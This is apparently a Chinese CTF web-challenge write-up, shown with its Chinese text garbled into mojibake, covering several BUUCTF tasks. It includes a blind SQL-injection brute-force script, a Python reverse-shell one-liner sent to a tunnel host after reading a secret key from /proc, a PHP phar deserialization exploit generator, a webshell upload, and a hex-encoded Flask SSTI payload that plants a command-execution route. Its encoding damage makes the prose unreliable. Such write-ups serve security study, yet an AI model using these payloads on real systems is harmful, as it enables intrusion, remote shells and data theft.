å¾—åˆ°è¡¨ååï¼Œæ‹¿ä¸åˆ°åˆ—åï¼Œè¿™é‡Œå¯ä»¥ç”¨æ— åˆ—åæ³¨å…¥ å…ˆè´´payload 2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) é‡‡ç”¨äº†å­—ç¬¦åç§» æŒ‰ä½å»æ¯”è¾ƒï¼Œå¦‚æœçˆ†ç ´å­—ç¬¦ä¸flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç›¸ç­‰ï¼Œå°±å‘åç»§ç»­ï¼Œå¤§äº†å°äº†éƒ½è¦ç»§ç»­å½“å‰çš„å¾ªç¯ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å­—ç¬¦ æ‰€ä»¥æœ€åçš„midè¦å‡ä¸€æ‰æ˜¯æ­£ç¡®çš„å­—ç¬¦ è¿™é‡Œæˆ‘ä»¬ä¼ å…¥åå…­è¿›åˆ¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦ mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ¯”è¾ƒçš„æ—¶å€™O(0x4f)çš„asciiæ¯”f(0x66)çš„asciiå°ï¼Œä½†æ˜¯æ¯”è¾ƒçš„ç»“æœæ˜¯Oæ¯”få¤§ è¿™é‡Œè¦å’Œflagçš„è¡¨çš„åˆ—æ•°ä¸€æ · æœ€åè·‘ä¸€ä¸‹æ‹¿flag import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot; #payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39; change &#x3D; &#39;&#39; database&#x3D; &#39;&#39; for j in range(1,100): for i in range(32,128): change &#x3D; database+chr(i) payload1 &#x3D; payload.format(change) print(payload1) data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;data) if &#39;Nu1L&#39; in r.text: database +&#x3D; chr(i-1) print(database) break [b01lers2020]Welcome to EarthæŠ“åŒ…ä¹‹åä¸€ç›´å¾€ä¸‹èµ° æºç é‡Œæ‰¾ä¸åˆ°å°±å»çœ‹js æœ€åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª éšæœºæ’åˆ—ç»„åˆå¾—åˆ°flag from itertools import permutations flag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;] item &#x3D; permutations(flag)#å¯¹flagå…¨æ’åˆ—ï¼Œè¿”å›çš„æ˜¯iteratorsï¼ˆè¿­ä»£å™¨ï¼‰ for i in item: k &#x3D; &#39;&#39;.join(i)#joinè¿æ¥æˆä¸ºå­—ç¬¦ä¸² if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;è¿™é‡Œè¿˜å¯ä»¥ç”¨pythonçš„startswichæ–¹æ³•åˆ¤æ–­æ˜¯å¦æ˜¯pctf&#123;heyå¼€å¤´ &#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;: print(k) [watevrCTF-2019]Cookie StoreæŠ“sessionï¼Œbase64è§£ç æŠŠé‡‘é¢æ”¹æˆ100ï¼Œæ”¾åŒ… [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown æºç æ²¡ä¸œè¥¿ï¼Œåªæœ‰ä¸ªurlçš„getå‚æ•°ï¼Œè¿˜ä»¥ä¸ºæ˜¯ssrfä¹‹ç±»çš„ï¼Œæœäº†ä¸‹wpï¼Œè¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒåŸå› ï¼Œæœ‰ä¸ªéé¢„æœŸè§£ éé¢„æœŸè§£ï¼š æœ‰æ–‡ä»¶è¯»å–ï¼Œç›´æ¥url=/flagå°±èƒ½ä¸‹è½½ä¸€ä¸ªbeautiful.jpg,æ”¹æˆtxtå°±èƒ½çœ‹è§flag é¢„æœŸè§£ï¼š /proc/self/ç›®å½•çš„æ„ä¹‰ æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚ è¯»ä¸€ä¸‹app.py url=app.py from flask import Flask, Response from flask import render_template from flask import request import os import urllib app &#x3D; Flask(__name__) SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot; f &#x3D; open(SECRET_FILE) SECRET_KEY &#x3D; f.read().strip() os.remove(SECRET_FILE) @app.route(&#39;&#x2F;&#39;) def index(): return render_template(&#39;search.html&#39;) @app.route(&#39;&#x2F;page&#39;) def page(): url &#x3D; request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res &#x3D; urllib.urlopen(url) value &#x3D; res.read() response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;) response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39; return response else: value &#x3D; &quot;HACK ERROR!&quot; except: value &#x3D; &quot;SOMETHING WRONG!&quot; return render_template(&#39;search.html&#39;, res&#x3D;value) @app.route(&#39;&#x2F;no_one_know_the_manager&#39;) def manager(): key &#x3D; request.args.get(&quot;key&quot;) print(SECRET_KEY) if key &#x3D;&#x3D; SECRET_KEY: shell &#x3D; request.args.get(&quot;shell&quot;) os.system(shell) res &#x3D; &quot;ok&quot; else: res &#x3D; &quot;Wrong Key!&quot; return res if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080) å¯ä»¥çœ‹åˆ°no_one_know_the_managerä¸­è¦åŒ¹é…SECRET_KEYï¼Œç„¶åæ‰§è¡Œshellï¼Œä½†æ˜¯SECRET_KEYæ‰€åœ¨çš„secret.txtè¢«åˆ æ‰äº† ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨openæ‰“å¼€çš„ï¼Œä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ã€‚ æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹å°±å¥½äº†æ­¤å¤„å¯ä»¥é€šè¿‡/proc/pid/fd/è¯»å–ï¼Œè¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ æ‹¿åˆ°keyçš„å†…å®¹ï¼Œè¦urlç¼–ç ï¼Œä½†æ˜¯shellæ‰§è¡Œçš„å‘½ä»¤ä¸ä¼šè¿”å›ï¼Œè¿™é‡Œä½¿ç”¨åå¼¹shellçš„æ–¹å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹è¯»å–flag nmdå¼¹äº†å‡ ä¸ªå°æ—¶ç»ˆäºå¼¹å‡ºæ¥äº† è¿™ç©æ„è¦å…¬ç½‘ipï¼Œæœäº†ä¸€åœˆæ²¡ä¸€ä¸ªè¯´è¿™ä¸ªäº‹çš„ï¼Œ æ²¡å…¬ç½‘ipï¼Œæäº†ä¸ªç«¯å£æ˜ å°„åçš„å…¬ç½‘ (23æ¡æ¶ˆæ¯) ç«¯å£æ˜ å°„åçš„å…¬ç½‘åå¼¹shell_æ¥åˆ°äº†å­¦æ¸£çš„åšå®¢-CSDNåšå®¢ https://natapp.cn/register æŠŠæœ¬åœ°çš„8082ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ æŠŠè¿™ä¸ªpayloadå½“shellå‚æ•°çš„å€¼æ‰“è¿›å» python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; ç„¶ååœ¨Ubuntué‡Œç›‘å¬8082ç«¯å£ï¼Œä»æ ¹ç›®å½•é‡Œæ‰¾åˆ°flag æ³ªç›® [SWPUCTF 2018]SimplePHPæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿™ä¸ªflieå‚æ•°æ„Ÿè§‰å¯ä»¥ç›´æ¥æ–‡ä»¶è¯»å– index.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;base.php&#39;; ?&gt; base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; &lt;div class&#x3D;&quot;container-fluid&quot;&gt; &lt;div class&#x3D;&quot;navbar-header&quot;&gt; &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;é¦–é¡µ&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt; &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt; file.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123; $show-&gt;source &#x3D; $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#39;file doesn\\&#39;t exists.&#39;); &#125; ?&gt; upload_file.php &lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt; &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶å:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; class.php &lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension &#x3D; end($temp); if(empty($extension)) &#123; &#x2F;&#x2F;echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; return false; &#125; &#125; &#125; ?&gt; class.php &lt;?php class C1e4r &#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str &#x3D; $name; &#125; public function __destruct() &#123; $this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test; &#125; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key &#x3D; $value; &#125; public function _show() &#123; if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123; die(&#39;hacker!&#39;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test &#123; public $file; public $params; public function __construct() &#123; $this-&gt;params &#x3D; array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value &#x3D; $this-&gt;params[$key]; &#125; else &#123; $value &#x3D; &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text &#x3D; base64_encode(file_get_contents($value)); return $text; &#125; &#125; ?&gt; è‚¯å®šæ˜¯ç”¨è¿™ä¸ªå‡½æ•°æ¥è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ååºåˆ—åŒ–çš„åœ°æ–¹ åŠ ä¸ªæ–°çŸ¥è¯† åˆ©ç”¨pharåè®®å®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡» æ¼æ´æˆå›  pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼›è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°(file_exists()ã€is_dir()ç­‰)å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ åŸç†åˆ†æ pharçš„ç»„æˆ é€šè¿‡æŸ¥é˜…æ‰‹å†Œå‘ç°pharç”±å››éƒ¨åˆ†ç»„æˆï¼›ç¿»é˜…æ‰‹å†Œå¯ä»¥çŸ¥é“ï¼Œpharç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯stubã€manifest describing the contentsã€ the file contentsã€ [optional] a signature for verifying Phar integrity (phar file format only) ä¸‹é¢è¿›è¡Œè§£é‡Šä¸€ä¸‹ï¼› 1 .0 a stub æ ‡è¯†ä½œç”¨ï¼Œæ ¼å¼ä¸º xxx&lt;?php xxx; __HALT_COMPILER();?&gt; ï¼Œå‰é¢ä»»æ„ï¼Œä½†æ˜¯ä¸€å®šè¦ä»¥__HALT_COMPILER();?&gt;ç»“å°¾ï¼Œå¦åˆ™phpæ— æ³•è¯†åˆ«è¿™æ˜¯ä¸€ä¸ªpharæ–‡ä»¶ï¼› 2 .0 a manifest describing the contents å…¶å®å¯ä»¥ç†è§£ä¸ºpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸­å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æœ‰å‹ç¼©ä¿¡æ¯å’Œæƒé™ï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„åºåˆ—åŒ–ä¹Ÿåœ¨é‡Œé¢ï¼› 3 .0 the file contents è¿™é‡ŒæŒ‡çš„æ˜¯è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼› 4 .0 [optional] a signature for verifying Phar integrity (phar file format only) ç­¾åï¼Œæ”¾åœ¨ç»“å°¾ï¼› C1e4rç±»ä¸­æœ‰__destruct(), __destruct()æ˜¯PHPä¸­çš„ææ„æ–¹æ³•ï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç¨‹åºç»“æŸæ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡ã€‚ å‡½æ•°ä¸­å‘ç°äº†echoï¼Œé‚£ä¹ˆè¦åˆ©ç”¨echo $this-&gt;testã€‚ showç±»æœ‰__toString(), __toStringæ–¹æ³•åœ¨å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚è¿›è¡Œechoï¼Œprintæ“ä½œæ—¶ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ åˆ©ç”¨$this-&gt;str[&#39;str&#39;]-&gt;source; Testç±»æœ‰__getï¼ˆï¼‰ __getï¼ˆï¼‰å½“æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ åˆ©ç”¨ $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value)); åˆ©ç”¨C1e4rç±»çš„__destruct()ä¸­çš„echo this-&gt;test2.è§¦å‘Showç±»çš„__toString()3.åˆ©ç”¨Showç±»çš„this-&gt;test2.è§¦å‘Showç±»çš„__toString()3.åˆ©ç”¨Showç±»çš„content = $this-&gt;str[&#39;str&#39;]-&gt;source4.è§¦å‘Testç±»çš„__get()5.æˆåŠŸåˆ©ç”¨file_get()`è¯»æ–‡ä»¶ ååºåˆ—åŒ–ç»“æœ &lt;?php class C1e4r &#123; public $test; public $str; &#125; class Show &#123; public $source; public $str; &#125; class Test &#123; public $file; public $params; &#125; $a &#x3D; new C1e4r(); $b &#x3D; new Show(); $c &#x3D; new Test(); $a -&gt;str &#x3D; $b; $b -&gt;str[&#39;str&#39;] &#x3D; $c; $c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;; $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.pharæ–‡ä»¶ $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;å›ºå®šçš„ $phar-&gt;setMetadata($a); &#x2F;&#x2F;è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡ $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å $phar-&gt;stopBuffering(); ?&gt; ç”Ÿæˆpharæ–‡ä»¶åï¼Œæ”¹ä¸ªåç¼€ä¸Šä¼ å°±è¡Œï¼Œpharçš„æ–‡ä»¶ä¸ç®¡ä»€ä¹ˆåç¼€éƒ½ä¼šç›´æ¥æ‰§è¡Œ çœ‹ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥æ ¹æ®æºç æ¨æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨phar://åè®®è®¿é—® å¾—åˆ°flag [HarekazeCTF2019]encode_and_encode source &lt;?php error_reporting(0); if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); exit(); &#125; function is_valid($str) &#123; $banword &#x3D; [ &#x2F;&#x2F; no path traversal &#39;\\.\\.&#39;, &#x2F;&#x2F; no stream wrapper &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;, &#x2F;&#x2F; no data exfiltration &#39;flag&#39; ]; $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true; &#125; $body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #bodyè·å–postæ•°æ® $json &#x3D; json_decode($body, true); #å¯¹bodyå˜é‡è¿›è¡Œjsonè§£ç  if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#åˆ¤æ–­bodyå˜é‡æ˜¯å¦æœ‰æ•ˆï¼Œjsonæ•°æ®è¦æœ‰page $page &#x3D; $json[&#39;page&#39;]; $content &#x3D; file_get_contents($page); #ä»pageä¸­è¯»å‡ºæ–‡ä»¶åï¼Œå¹¶è¯»å–æ–‡ä»¶ if (!$content || !is_valid($content)) &#123;#æ£€æŸ¥contentæ˜¯å¦æœ‰æ•ˆ,å³ä¸èƒ½æ˜æ–‡ä¼ è¾“flagæ–‡ä»¶ï¼Œåˆ©ç”¨phpä¼ªåè®®ç»•è¿‡ $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\\n&quot;; &#125; &#125; else &#123; $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;; &#125; &#x2F;&#x2F; no data exfiltration!!! $content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\\&#123;.+\\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#å¦‚æœæŸ¥åˆ°contenté‡Œæœ‰ç›¸å…³çš„ctfå­—æ ·ï¼Œåˆ™ç”¨censoredæ›¿ä»£ echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#æœ€åå°†jsonç¼–ç åçš„contentè¾“å‡º [WUSTCTF2020]CV Makerè¿›å»åæ˜¯ä¸ªçœ‹èµ·æ¥å¾ˆé«˜ç«¯çš„ç•Œé¢ï¼Œä½†æ˜¯æ³¨å†Œç„¶åç™»å½•åæœ‰ä¸ªæ˜æ˜¾ çš„ä¸Šä¼ ä½ç½® é€šè¿‡æ›´æ”¹å¤´åƒä¼ ä¸ªé©¬ä¸Šå»ï¼Œèšå‰‘è¿æ¥å°±è¡Œ è¿™é‡Œå‰ç«¯æœ‰ä¸ªåˆ¤æ–­å›¾ç‰‡ç±»å‹çš„åœ°æ–¹ï¼Œæ‰€ä»¥å…ˆä¼ ä¸ªjpgå†bpæŠ“åŒ…æ”¹æˆphpå°±è¡Œ [RootersCTF2019]I_&lt;3_Flasksstiæ³¨å…¥ï¼Œç”¨ä½¿ç”¨å·¥å…·Arjunè¿›è¡Œå‚æ•°çˆ†ç ´ ç„¶åæ‰¾åˆ°nameå‚æ•°åï¼Œæ‹¿å‡ºçè—çš„å†™å…¥shellçš„payload ctfä¸­flask_sstiçš„å„ç§ç»•è¿‡æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) &#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x0a\\x0a\\x40\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x2e\\x72\\x6f\\x75\\x74\\x65\\x28\\x27\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x27\\x2c\\x6d\\x65\\x74\\x68\\x6f\\x64\\x73\\x3d\\x5b\\x27\\x47\\x45\\x54\\x27\\x2c\\x27\\x50\\x4f\\x53\\x54\\x27\\x5d\\x29\\x0a\\x64\\x65\\x66\\x20\\x73\\x68\\x65\\x6c\\x6c\\x28\\x29\\x3a\\x0a\\x20\\x20\\x20\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73\\x0a\\x20\\x20\\x20\\x20\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x0a\\x20\\x20\\x20\\x20\\x63\\x6d\\x64\\x3d\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x61\\x72\\x67\\x73\\x2e\\x67\\x65\\x74\\x28\\x27\\x63\\x6d\\x64\\x27\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x74\\x3d\\x6f\\x73\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x63\\x6d\\x64\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x72\\x74&#39;) %&#125;&#123;% endif%&#125; å…¶ä¸­çš„16è¿›åˆ¶ç¼–ç äº†åŸå§‹ä»£ç  å³ from flask import current_app 